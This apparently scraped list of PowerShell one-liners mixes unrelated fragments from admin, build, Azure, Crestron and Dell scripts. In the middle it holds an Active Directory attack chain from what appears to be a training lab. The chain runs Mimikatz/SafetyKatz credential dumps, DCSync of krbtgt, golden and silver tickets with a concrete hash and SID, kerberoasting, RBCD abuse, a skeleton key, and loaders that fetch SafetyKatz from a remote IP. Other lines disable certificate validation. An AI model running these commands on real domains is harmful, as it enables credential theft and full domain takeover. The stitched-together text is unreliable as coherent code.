PackageManagement\Uninstall-Package @PSBoundParameters -ErrorAction Stop
Set-PSRepository @repositoryParameters -ErrorAction 'Stop'
Register-PSRepository @repositoryParameters -ErrorAction 'Stop'
Unregister-PSRepository -Name $Name -ErrorAction 'Stop'
Reset-PerContainerState -RootBlock $rootBlock
PostProcess-DiscoveredBlock -Block $childBlocks -Filter $Filter -BlockContainer $BlockContainer -RootBlock $RootBlock
PostProcess-ExecutedBlock -Block $childBlocks
Reset-TestSuiteState
Get-ChildItem -Recurse -Path $p -Filter "*$Extension" -File
Add-Member -Name UnresolvedPath -Type NoteProperty -Value $p -InputObject $item
Get-ChildItem -Recurse -Path $p -Filter "*$Extension" -File
Add-RSpecTestObjectProperties $Context . Test
Add-RSpecBlockObjectProperties $Context . Block
Remove-MockFunctionsAndAliases
Get-RSpecObjectDecoratorPlugin
Set-Hint -Hint "$Hint ($hashcode))" -InputObject $internalSessionState
Set-Hint -Hint $internalSessionState . Hint -InputObject $SessionState -Force
Set-Hint -Hint "$Hint (Unbound)" -InputObject $ScriptBlock -Force
Set-Hint -Hint $internalSessionState . Hint -InputObject $ScriptBlock -Force
Test-ParameterValue -Value $Value -Type 'SourceUri' -ProviderName $ProviderName
Import-LocalizedData -BindingVariable LocalizedData -FileName PSDesiredStateConfiguration.Resource.psd1 -ErrorAction SilentlyContinue
ConvertTo-MOFInstance MSFT_Credential $newValue
Initialize-ConfigurationRuntimeState $Name
Export-ModuleMember Disable-PSTrace , Enable-PSTrace , Get-LogProperties , Set-LogProperties
Send-EnvironmentChangeMessage
Set-PSGetSettingsVariable -Force
Set-EnvironmentVariable -Name 'PATH' ` -Value "$currentPATHValue;$scopePath" ` -Target $envVariableTarget
Start-Process $filename -ArgumentList "$arguments -V minimal" ` -Wait ` -WorkingDirectory $PSHOME ` -NoNewWindow
Microsoft.PowerShell.Management\Get-ChildItem $Path -recurse |
Microsoft.PowerShell.Management\Set-Content -Value $ScriptMetadataString -Path $tempScriptFilePath -Force -WhatIf: $false -Confirm: $false
Microsoft.PowerShell.Management\Set-Content -LiteralPath $tempScriptFilePath ` -Value $ScriptMetadataString , $scriptFileContents ` -Force ` -WhatIf: $false ` -Confirm: $false
Save-ModuleSources
Get-Content $ConfigPath | Set-Variable ini -Scope $Scope
Set-PSModulePath $buildCachePath
Get-Module -Name $moduleName
Set-PSReadLineOption -HistorySearchCursorMovesToEnd
Set-PSReadLineKeyHandler -Key F7 ` -BriefDescription History ` -LongDescription 'Show command history' ` -ScriptBlock {
Set-PSReadLineKeyHandler -Key Ctrl+b ` -BriefDescription BuildCurrentDirectory ` -LongDescription "Build the current directory" ` -ScriptBlock {
Set-PSReadLineKeyHandler -Key Ctrl+q -Function TabCompleteNext
Set-PSReadLineKeyHandler -Key Ctrl+C -Function Copy
Set-PSReadLineKeyHandler -Chord 'Ctrl+d,Ctrl+c' -Function CaptureScreen
Set-PSReadLineKeyHandler -Key Alt+d -Function ShellKillWord
Set-PSReadLineKeyHandler -Key Alt+w ` -BriefDescription SaveInHistory ` -LongDescription "Save current line in history but do not execute" ` -ScriptBlock {
Set-PSReadLineKeyHandler -Key Ctrl+V ` -BriefDescription PasteAsHereString ` -LongDescription "Paste the clipboard text as a here string" ` -ScriptBlock {
Set-PSReadLineKeyHandler -Key 'Alt+(' ` -BriefDescription ParenthesizeSelection ` -LongDescription "Put parenthesis around the selection or entire line and move the cursor to after the closing parenthesis" ` -ScriptBlock {
Set-PSReadLineKeyHandler -Key "Alt+'" ` -BriefDescription ToggleQuoteArgument ` -LongDescription "Toggle quotes on the argument under the cursor" ` -ScriptBlock {
Set-PSReadLineKeyHandler -Key "Alt+%" ` -BriefDescription ExpandAliases ` -LongDescription "Replace all aliases with the full command" ` -ScriptBlock {
Set-PSReadLineKeyHandler -Key F1 ` -BriefDescription CommandHelp ` -LongDescription "Open the help window for the current command" ` -ScriptBlock {
Set-Alias -Name su -Value admin
Remove-Variable identity
Copy-Item -Path Env:PATH -Destination Env:_OLD_VIRTUAL_PATH
Set-Alias exist Test-Path -Option "Constant, AllScope"
Remove-Item $tmp -Force
Set-ItemProperty NuGet.exe -Name IsReadOnly -Value $false
Get-WindowsCapability -Online | ? Name -like 'OpenSSH*'
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Set-Service -Name sshd -StartupType 'Automatic'
Get-NetFirewallRule -Name *ssh*
New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
Get-WindowsCapability -Name RSAT* -Online | Add-WindowsCapability -Online
Start-Sleep -Seconds $wait #waits an amount of seconds
Invoke-RestMethod -Uri $ApproveURL -Method Post -Body $ConvertedToJSON -Certificate $RACertificate -WebSession $sesh
Get-Module | ? Path -eq ( "$PSScriptRoot/public/_Classes.ps1" | Resolve-Path ) | Remove-Module
Set-CdExtrasOption -Option 'AUTO_CD' -Value $global:cde . AUTO_CD
Set-Location -Path $( [ System.IO.Path ] :: GetDirectoryName ( $myInvocation . MyCommand . Definition ) )
Copy-Item -Path Env:PATH -Destination Env:_OLD_VIRTUAL_PATH
Add-Content $Env:GITHUB_PATH $Path -Encoding UTF8
Import-ParameterConfiguration
get-launcher ( "$single_manifest" )
get-files ( $xml_path )
get-manifests
Get-AzSubscription
Select-AzSubscription -SubscriptionId "c5a29ff8-babb-4c3f-963e-5abcab3fbe9e"
Get-AzPolicyDefinition
Remove-AzPolicyAssignment -Id "/subscriptions/c5a29ff8-babb-4c3f-963e-5abcab3fbe9e/providers/Microsoft.Authori zation/policyAssignments/67366089189140e593e548f6"
New-AzPolicyDefinition -Name 'AuditStorageAccounts' -DisplayName 'Audit Storage Accounts Open to Public Networks' -Policy pol-def.txt
Remove-AzPolicyDefinition -Name 'AuditStorageAccounts'
Get-AzPolicySetDefinition
New-AzPolicySetDefinition -Name 'Raj-PolicySetDefinition' -Metadata '{"catego ry":"Rajs Category"}' -PolicyDefinition pol-set.json
Remove-AzPolicyAssignment -Id "/subscriptions/c5a29ff8-babb-4c3f-963e-5abcab3fbe9e/providers/Microsoft.Authorization/policyAssignments/Name Assignment from PS"
Remove-AzPolicySetDefinition -Name 'Raj-PolicySetDefinition'
New-AzRoleAssignment -RoleDefinitionName Owner -Scope "/subscriptions/c5a29ff8-babb-4c3f-963e-5abcab3fbe9e" -SignInName sushmita.murmu@rajkmarandi.co.in
Remove-AzRoleAssignment -Scope "/subscriptions/c5a29ff8-babb-4c3f-963e-5abcab3fbe9e" -RoleDefinitionName Owner -SignInName sushmita.murmu@rajkmarandi.co.in -Confirm
New-AzRoleAssignment -ResourceGroupName az203rg -SignInName sushmita.murmu@rajkmarandi.co.in -RoleDefinitionName Owner
Remove-AzRoleAssignment -ResourceGroupName az203rg -RoleDefinitionName Owner -SignInName sushmita.murmu@rajkmarandi.co.in -Confirm
New-AzRoleAssignment -RoleDefinitionName Owner -Scope "/subscriptions/c5a29ff8-babb-4c3f-963e-5abcab3fbe9e" -ObjectId 02754431-edce-4d81-93da-caa537fae317
New-AzRoleDefinition -InputFile custom-rbac-rule.json
New-AzRoleAssignment -ResourceGroupName az203rg -SignInName sushmita.murmu@rajkmarandi.co.in -RoleDefinitionName "Custom Role By Raj"
Remove-AzRoleDefinition -Name "Custom Role By Raj"
Set-AzResourceGroup -Name azfromcli -Tag @{ Owner = "Raj Kishore Marandi" }
Get-AzResource -TagName "ProjectId"
Set-AzResourceGroup -name azfromcli -Tag $tags
Set-AzResourceGroup -Name azfromcli -Tag @{ }
Export-ModuleMember -Function 'Clone-All' -Alias 'clall'
New-FolderForced -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\CloudContent"
Import-Module AWSPowerShell
Invoke-Expression "git checkout ""$branch"" ""remotes/$remote/$branch""" ;
Connect-SPOService -Url < admin site url> ;
Set-AzureADUserLicense -ObjectId $upn -AssignedLicenses $assignedLicenses ;
Remove-Item $rootDir\Dumps\* -Force -Recurse
Add-Member -inputObject $infoObject -memberType NoteProperty -name "Computer Name" -value $CPU . SystemName
Set-StrictMode -Version Latest
Set-Alias cd Pscx\Set-LocationEx -Force -Scope Global -Option AllScope -Description "PSCX alias"
Import-LocalizedData -BindingVariable msgTbl -FileName Messages
Write-Progress -id 1 "Caching Help Documentation" $assembly . getname ( ) . name
add-type -a system.web
Update-HostWindowTitle
Set-Alias Resize-Bitmap Pscx\Set-BitmapSize -Description "PSCX alias"
Import-Module $path -DisableNameChecking
Stop-Transcript | Out-Null
cmd.exe /c " `"$Path`" $Parameters && set " > $tempFile
Get-Content $tempFile | Foreach-Object {
Get-Module | Select -ExpandProperty exportedformatfiles | % ` {
Get-PSSnapin | ? { $_ . name -notmatch "Microsoft\." } | select applicationbase , formats | % ` {
Set-StrictMode -Version 1.0
Add-Type -Assembly System.Web
Export-ModuleMember
Export-ModuleMember Disable-PSTrace , Enable-PSTrace , Get-LogProperties , Set-LogProperties
Start-Process powershell.exe "-File" , ( '"{0}"' -f $MyInvocation . MyCommand . Path ) -Verb RunAs
cd\
cd..
C:
Get-ChildItem $PSScriptRoot\ -Recurse -Filter "*.ps1" -Exclude "*.ps1xml" |
Get-ChildItem -path Cert:\LocalMachine\My |
set-executionpolicy remotesigned -force
set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
New-Item -Path "HKCU:\Software\Microsoft\Internet Explorer\SearchScopes" -Name "{E654518E-3688-45C9-A3F3-0FD51CADB782}" -Force
Stop-Process -Name Explorer
Copy-Item -Path Env:PATH -Destination Env:_OLD_VIRTUAL_PATH
Remove-Variable Authentication
certutil.exe -verify $FilePath > $null
certutil.exe -addstore TrustedPeople $CertificatePath
Get-ChildItem -LiteralPath $expandDestPath -Filter 'migu-1m-*.ttf' -File -Recurse -Depth 2 |
Copy-Item -LiteralPath $_ . FullName -Destination $fontPath
Start-Process -FilePath 'C:\Windows\System32\reg.exe' -ArgumentList 'import' , $regFilePath -Wait
Restart-PowerShellConsoleAsAdmin
Install-DownloadedFontFile -DownloadFilePath $downloadFilePath
Set-ConsoleFontRegistry -WorkFolderPath $workFolderPath
Remove-Item -Path $workFolderPath -Recurse
Publish-AspNet -publishProperties $publishProperties -packOutput $packOutput -pubProfilePath $pubProfilePath
GenerateInternal-AppSettingsFile -packOutput $packOutput -environmentName $publishProperties [ 'EnvironmentName' ] -connectionStrings $publishProperties [ 'DestinationConnectionStrings' ]
Unregister-Event -SourceIdentifier $stdErrEvent . Name | Out-Null
Export-ModuleMember -function *
InternalRegister-AspNetKnownPublishHandlers
Export-ModuleMember -Function * -Variable *
Start-Sleep -Milliseconds 50
Write-W2VInfo "Looking for $($SourcePath)..."
Write-W2VWarn "Specifying -VHDPath and -WorkingDirectory at the same time is contradictory."
Write-W2VInfo "Attaching $VHDFormat..."
Write-W2VInfo "Generating name for $($VHDFormat)..."
Write-W2VInfo "Done."
Write-Progress -Activity RobocopyTransfer -Status ( "Copied: {0} of {1} files | Copied: {2} of {3} GB | Percent complete: {4}%" -f $CopiedFileCount , $TotalFileCount , $GigabytesCopied , $GigabytesTotal , [ math ] :: Round ( $Percentage , 2 ) ) -PercentComplete $Percentage
Write-Progress -Activity RobocopyTransfer -Status "Ready" -Completed
Get-ChildItem -Path "$PSScriptRoot\*.ps1" -Exclude *.Tests.ps1 | ForEach-Object { . $_ . FullName }
Set-Alias -Name Count-Loc -Value Measure-Loc
Import-Module Microsoft.Online.SharePoint.Powershell -ErrorAction SilentlyContinue
Set-Location -Path "D:\Git Repos\"
Import-Module PSCrestron
Remove-Item ".\Desktop\Screenshots" -Recurse -ErrorAction SilentlyContinue
New-Item -Path ".\Desktop" -Name "Screenshots" -ItemType "directory" -ErrorAction SilentlyContinue
Close-CrestronSession $session
New-Item -Path . -Name "IP.txt" -ItemType "file" -ErrorAction SilentlyContinue
Set-StrictMode -Version Latest
Import-Module PSCrestron
Set-StrictMode -Version Latest
Import-Module PSCrestron
Set-Variable -Name session -Value $null -Scope Global
Import-Module PSCrestron
Get-FTPFile -Device '' -RemoteFile '' -Username crestron -Password crestron -LocalPath $file
Set-StrictMode -Version Latest
Export-ModuleMember -Function *-Authentication
Import-Module PSCrestron
Remove-Item "$home\Desktop\CrestFinder Results.csv" -ErrorAction SilentlyContinue
Invoke-RunspaceJob -InputObject $devs -ScriptBlock {
Import-Csv "$home\Desktop\CrestFinder Results.csv" | sort IP –Unique | export-csv "$home\Desktop\CrestFinder Results SORTED.csv" -NoTypeInformation -Force
Remove-Item "$home\Desktop\CrestFinder Results.csv" -ErrorAction SilentlyContinue
import-module pscrestron
Get-DumpDMIPConfig -Device $_ | Where-Object { [ int ] $_ . Port -gt 0 } |
Convert-EdidToSerial -Path $Path -Slot $Slot -Join $join -MismatchedEDID $MismatchedEDID |
Send-EdidFile -Device $r . Device -Path $r . File -Slot $r . Slot ` -Join ( $r . Input * 10 + 31 ) -MismatchedEDID $r . Mode -Port $r . Port ` -Secure: $r . Secure -Username $r . Username -Password $r . Password
Import-Module PSCrestron
remove-item -Path "$home\Password Change Results.csv" -ErrorAction SilentlyContinue
Invoke-CrestronSession $session 'AUTH ON'
Invoke-CrestronSession $session 'reboot'
Invoke-Item -Path "$home\Password Change Results.csv"
remove-item -Path "$home\Firmware Update.csv" -erroraction silentlycontinue
Invoke-RunspaceJob -InputObject $devs -ScriptBlock {
Add-Member -InputObject $dVersionInfo -NotePropertyName "Firmware Upgrade" -NotePropertyValue $consoleSession -erroraction 'silentlycontinue'
Add-Member -InputObject $dVersionInfo -NotePropertyName "Auth Method" -NotePropertyValue $cMethod -erroraction 'silentlycontinue'
Import-Csv -Path $deviceList | ForEach-Object { [ PSCustomObject ] @{ 'IP' = $_ . IP ; 'Port' = $_ . Port ; 'Procname' = $_ . Procname } }
Get-FTPFile -Device $FtpServer -RemoteFile $FirmwareLocation -Username $Username -Password $Password -LocalPath $LocalDir
Update-PUF -Device $IP -Port $Port -Path $LocalDir -ShowProgress
Import-Module PSCrestron
Add-Type -Path ( Join-Path $PSScriptRoot 'Renci.SshNet.dll' )
Invoke-CrestronSession $session "$password"
Invoke-CrestronSession $session "$newpassword"
rename-item "$home\Desktop\Screenshots\$shotname.bmp" -NewName "$home\Desktop\Screenshots\$shotname.png"
Invoke-RunspaceJob -InputObject $devs -ScriptBlock {
Invoke-RunspaceJob -InputObject $portopen -ScriptBlock {
Invoke-RunspaceJob -InputObject $portclosed -ScriptBlock {
Remove-Item "$home\Desktop\Errors.txt" -ErrorAction SilentlyContinue
Remove-Item "$home\Superscript Results.csv" -ErrorAction SilentlyContinue
Close-CrestronSession $session
import-csv "$home\Superscript Results.csv" | export-csv -Path "$home\Superscript Results Log.csv" -NoTypeInformation -Append -erroraction SilentlyContinue
Invoke-item "$home\Superscript Results.csv" -erroraction SilentlyContinue
Add-Type @" using System.Net; using System.Security.Cryptography.X509Certificates; public class TrustAllCertsPolicy : ICertificatePolicy { public bool CheckValidationResult( ServicePoint srvPoint, X509Certificate certificate, WebRequest request, int certificateProblem) { return true; } } "@
Remove-Item -Path "$home\MTR Results.csv" -ErrorAction SilentlyContinue -Force
import-csv -Path "$home\MTR Results.csv" | out-gridview
import-csv -Path "$home\MTR Results.csv" | Export-Csv "$home\MTR Results Log.csv" -Append
Get-AutoDiscovery -ShowProgress |
Remove-Event -EventIdentifier $( $e . EventIdentifier )
Get-DomainController -domain < domain>
Get-DomainUser -LDAPFilter "Description=*built*" | Select name , description
Get-DomainComputer -domain < domain> | select name
Get-DomainGroup -domain < domain> | select name
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
Get-DomainGroup -UserName student575
Get-NetLocalGroup -ComputerName dcorp-student575 -ListGroups
Get-NetLoggedon -ComputerName < servername>
Get-NetLoggedonLocal -ComputerName < servername>
Invoke-ShareFinder -verbose
Invoke-FileFinder -verbose
Get-NetFileServer
Get-DomainGPO
Find-InterestingDomainACL -ResolveGUIDs
Get-PathAcl -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol"
Find-DomainUserLocation -Verbose
Find-DomainUserLocation -CheckAccess
Find-DomainUserLocation -Stealth
Get-ForestDomain -Forest < forest>
Get-ForestGlobalCatalog -Forest < forest>
SafetyKatz.exe "sekurlsa::ekeys"
SharpKatz.exe --Command ekeys
rundll32.exe C:\Dumpert\Outflank-Dumpert.dll , Dump )
pypykatz.exe live lsa
Invoke-Mimikatz -Command '"sekurlsa:pth /user:Administrator /domain:us.techcorp.local /aes256:<aes256key> /run:powershell.exe"'
Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createonly:C:\Windows\System32\cmd.exe /show /ptt
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
C:\Users\Public\Loader.exe -path http://192.168.100.75/SafetyKatz.ex
C:\Users\Public\AssemblyLoad.exe http://192.168.100.75/Loader.exe -path http://192.168.100.75/SafetyKatz.exe
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff47a9d8bd66ce7efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
Rubeus.exe kerberoast /stats
Rubeus.exe kerberoast /user:svcadmin /simple
Rubeus.exe kerberoast /stats /rc4opsec
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
Get-DomainUser -PreauthNotRequired -Verbose
Find-InterestingDomainAcl -ResolveGUIDs | ? { $_ . IdentityReferenceName -match "RDPUsers" }
Get-ASREPHash -UserName VPN575user -Verbose
Invoke-ASREPRoast -Verbose
Set-DomainObject -Identity support575user -Set @{ serviceprincipalname = 'ops/whatever1' }
Rubeus.exe kerberoast /outfile:targetedhashes.txt
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName dcorp-dc
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff47a9d8bd66ce7efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
Invoke-Mimikatz -Command '"kerberos:golden /domain:<domain> /sid:<SID> /target:<target> /service:CIFS /rc4:<rc4> /user:Administrator /ptt"'
Invoke-Mimikatz -Command '"kerberos:golden /domain:<domain> /sid:<SID> /target:<target> /service:HOST /rc4:<rc4> /user:Administrator /ptt"'
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
Enter-PSSession -ComputerName dcorp-dc -credential dcorp\Administrator
tgs::s4u /tgt:<tgt> /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-mssql.dollarcorp.moneycorp.local
Rubeus.exe s4u /user:websvc /aes256:<aes256> /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.local /ptt
tgs::s4u /tgt:<tgt> /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.local | ldap/dcorp-dc.dollarcorp.moneycorp.local
Invoke-Mimikatz -Command '"kerberos::ptt <ticket>"'
Rubeus.exe s4u /user:dcorp-adminsrv$ /aes256:<aes256> /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollacorp.moneycorp.local /altservice:ldap /ptt
Find-InterestingDomainAcl | ? { $_ . identityreferencename -match 'ciadmin' }
Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-student575$|dcorp-std575$' -Verbose
C:\AD\Tools\SafetyKatz.exe -Command "sekurlsa::ekeys" "exit" from a locally elevated shell
Rubeus.exe s4u /user:dcorp-std575$ /aes256:873611228c73d17456c010b2ac127331b8e774cd6a9ac3e668b659d06ca0af8b /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
C:\Windows\System32> echo F | xcopy C:\AD\Tools\Rubeus.exe \\dcorp-appsrv\c$\Users\Public\Rubeus.exe /Y
C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
Rubeus.exe ptt /ticket:<TICKET>
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:<SID> /sids:<SIDS> /rc4:<rc4> /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi"'
C:\AD\Tools\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:<SID> /sids:<SIDS> /krbtgt:<ntlm> /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
Enter-PSSession dcorp-adminsrv
Get-PSHostProcessInfo ( while on an alive session )
Enter-PSSession -Session $adminsrv
Invoke-Command -ScriptBlock { whoami ; Get-Host } -ComputerName dcorp-adminsrv // Can specify a list of computer names.
Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName ( Get-Content < list_of_servers> )
Write-Status 'Removing files...'
Add-Type -AssemblyName System.DirectoryServices
Write-AddACEToFile
Write-Status 'Checking if we can bind to AD...'
Write-Status 'Finding Naming context for Configururation and Schema stores partitions...'
Start-Sleep $sleepInterval
Start-Sleep ( $sleepInterval )
Write-Status 'Adding ourself as potential replication partner...'
Write-Status "Retrieving groupmembership for user $($global:ldapConnInfo.username)..."
Write-Status "Getting schema classes..."
Write-Status "Getting extended rights from schema..."
Start-sleep -Seconds 0.5
Invoke-Build "$PSScriptRoot\Curl2PS.build.ps1" -Task $Task
Copy-Item "$srcPath\$moduleName.psd1" -Destination $modulePath
Remove-Item -LiteralPath $file . FullName -Force -Confirm: $false | Out-Null
Remove-Item $projectDir/lib -Recurse -Force | out-null
Copy-Item -Path $font . FullName -Destination $destination
Remove-Item $file -Force -ErrorAction SilentlyContinue
Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
Add-Type -AssemblyName System.Windows.Forms
Start-Process -FilePath "diskpart.exe" -ArgumentList "list disk" -Verb RunAs
Create-LocalGroup -MainFolder "Rank" -SubFolder "Share" -Name $Read
Import-Module ActiveDirectory
Get-Customer -ReturnSqlQuery | NormalizeQuery | Test-QueryMatch $Expected | Should Be $true
Select-String -InputObject $_ -Pattern '\<a name=(\''|\")(?<bookmark>[^\>]+)(\''|\")\s*\\?\>' | Select-Object -ExpandProperty Matches | ForEach-Object {
Export-ModuleMember
Add-Type @' using System.Collections; // Needed for IList using System.Management.Automation; using System.Collections.Generic; namespace ROE { public sealed class TransformParameterAttribute : ArgumentTransformationAttribute { public string TransformScript { get { return _transformScript; } set { _transformScript = value; } } string _transformScript; public TransformParameterAttribute(string transformScript) { _transformScript = string.Format(@" # Assign $_ variable $_ = $args[0] # The return value of this needs to match the C# return type so no coercion happens $FinalResult = New-Object System.Collections.ObjectModel.Collection[psobject] $ScriptResult = {0} # Add the result and emit the collection $FinalResult.Add((,$ScriptResult)) # (Nest result in one element array so it can survive the trip back out to PS environment) $FinalResult", transformScript); } public override object Transform(EngineIntrinsics engineIntrinsics, ob
Set-StrictMode -Version Latest
Copy-Item -Path @(
Import-Module -Name PlatyPS
Update-ModuleManifest -ModuleVersion $newVersion -Path .\DataProtectionManagerCX.psd1 -ReleaseNotes $ReleaseNotes
Import-Module PScribo
Invoke-DbcCheck -Checks lastbackup
Invoke-DbcCheck -Checks failedjobs
Invoke-DbcCheck -Checks SPN
Invoke-DbcCheck -Check DiskCapacity
Invoke-DbcCheck -Checks AutoClose , AutoShrink , LastGoodCheckDB , LogFileSize , OrphanedUser , Trustworthy
Invoke-DbcCheck -AllChecks
Get-DbcCheck | Out-GridView
Clear-DbcPowerBiDataSource
Invoke-DbcCheck -AllChecks -passthru | Update-DbcPowerBiDataSource
Start-DbcPowerBi
Set-DbcConfig app.computername computername
Set-DbcConfig app.sqlinstance localhost
Set-DbcConfig command.invokedbccheck.excludedatabases StackOverflow2010
Update-Dbchecks
Get-DbcConfig | Out-GridView
Select-DefaultView -InputObject $object -Property ComputerName , InstanceName , SqlInstance , ID , Name , Whatever , Whatever2
New-Item -Path $scriptsDir -Name $fileName -ItemType File | Out-Null
New-Item -Path $projectDir -Name $settingsFileName -ItemType File | Out-Null
Start-Process -FilePath $DCUProgramName -ArgumentList "/scan -report=$Temp_Folder" -Wait -WindowStyle Hidden
Remove-Item -Path $Temp_Folder$ReportFileName -Force
Set-Location \
New-Item -Path HKLM:\SOFTWARE\DELL\UpdateService\Service\ -Name IgnoreList -ItemType key -Force
Set-ItemProperty -path $IgnoreListPath -Name $IgnoreListValue -Value "" -Force
restart-Service -Name DellClientManagementService -Force -Verbose
Set-ItemProperty -path $IgnoreListPath -Name $IgnoreListValue -Value $RegValueJSON -Force
New-EventLog -LogName 'Dell' -Source 'DCURegValue' -ErrorAction Ignore
Write-EventLog -LogName Dell -Source DCURegValue -EntryType Information -EventId 0 -Message $IgnoreListCurrentJSON -ErrorAction SilentlyContinue
Write-EventLog -LogName Dell -Source DCUBlocklist -EntryType Information -EventId 0 -Message $RegValueJSON -ErrorAction SilentlyContinue
Write-EventLog -LogName Dell -Source DCUBlocklistScriptResult -EntryType SuccessAudit -EventId 0 -Message "Script was run and set new registry value to this machine" -ErrorAction SilentlyContinue
Write-EventLog -LogName Dell -Source DCUUpdateRing -EntryType Information -EventId 0 -Message "update ring used was: $RingUpdate " -ErrorAction SilentlyContinue
Write-EventLog -LogName Dell -Source DCUBlocklistScriptResult -EntryType Error -EventId 2 -Message "DCU Blocklist Script could not run because no DCU is installed on this machine" -ErrorAction SilentlyContinue
Set-Pwd -File $SRS_Config -Search "EXTERNAL_AWACS_MODE_BLUE_PASSWORD" -Pwd $BluPwd
Set-Pwd -File $SRS_Config -Search "EXTERNAL_AWACS_MODE_RED_PASSWORD" -Pwd $RedPwd
Export-ModuleMember -Cmdlet Debug-Module , Enter-Debugger , Invoke-IfDebug
Set-Alias -Force -Name breakpoint -Value Enter-Debugger
Set-Alias -Force -Name ifdebug -Value Invoke-IfDebug
remove-item "$DownloadLocation\DCUApplicableUpdates.xml" -Force
Stop-Process -Name "DellCommandUpdate" -ErrorAction SilentlyContinue
remove-item "$DownloadLocation\DCUApplicableUpdates.xml" -Force
Expand-Archive -Path $zipFileNameAndPath -DestinationPath "$env:TEMP\DCU"
Remove-Item -Path "$env:TEMP\DCU" -Recurse -Force
New-PSDrive -Name HKU -Root HKEY_USERS -PSProvider Registry
New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce -Name '!ScriptRemoval' -PropertyType 'String' -Value "cmd /c DEL $PSCommandPath /F /Q"
Connect-AzureAD
Get-IntuneConfig
Set-Alias / \ -Description 'Push location to `$env:DevRoot'
Set-Location $env:SrcDir
Copy-Item $ScriptsDir\_user.ps1 $env:ShellDir\.git
Copy-Item $env:ShellDir\.git\_user.ps1 $ScriptsDir -Verbose
Copy-Item $ScriptsDir\_user.ps1.txt $ScriptsDir\_user.ps1
Set-Location $env:SrcDir
Get-ChildItem -Directory -Exclude $ExcludeList | foreach {
Import-Module .\posh-git
Use-Tool ConEmu ConEmu$(if ($Pscx:Is64BitProcess) {'64'}).exe
Set-Alias -Name vs -Value $devenvPath
New-Item -path $tsRegKey
Copy-Item -Path Env:PATH -Destination Env:_OLD_VIRTUAL_PATH
docker-compose up -d
docker-compose down
docker-compose stop
Install-Module -Name DockerMsftProvider -Repository PSGallery -Force
Install-Package -Name docker -ProviderName DockerMsftProvider
Restart-Computer -Force
Get-WindowsFeature -Name Containers
Get-Package -Name Docker -ProviderName DockerMsftProvider
Start-Service Docker
C:\ProgramData\Docker
Pop-Location
docker-compose up -d
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Ribbon" -Name MinimizedStateTabletModeOff -Value 1 ;
Set-PSReadLineOption -EditMode Emacs
Push-Location -Path $PSScriptRoot -StackName BeforeBuild
Get-ChildItem -Path ".build/" -Recurse -Include *.ps1 -ErrorAction Ignore | ForEach-Object {
Import-Module PSDepend -ErrorAction Stop
Invoke-PSDepend @PSDependParams
Set-PSRepository -Name $Gallery -InstallationPolicy $Policy
Import-Module ExchangeOnlineManagement
Start-Sleep -s 1
Connect-ComplianceCenter
Show-NewExportJob $SearchName $Region $Format $SharePointArchiveFormat $ExchangeArchiveFormat $Scope $Dedupe
Show-FinishedExportJob $SearchName
Register-EditorCommand ` -Name 'Todo.InsertTodo' ` -DisplayName 'Insert Todo' ` -SuppressOutput ` -ScriptBlock {
Register-EditorCommand ` -Name "PlasterTemplates.InvokeModuleTemplate" ` -DisplayName "Create New Module from Template" ` -SuppressOutput ` -ScriptBlock {
Register-EditorCommand ` -Name "PlasterTemplates.InvokeTemplateList" ` -DisplayName "Create Template from List" ` -SuppressOutput ` -ScriptBlock {
Register-EditorCommand ` -Name "PlasterTemplates.InvokeToolkitTemplate" ` -DisplayName "Create New Toolkit from Template" ` -SuppressOutput ` -ScriptBlock {
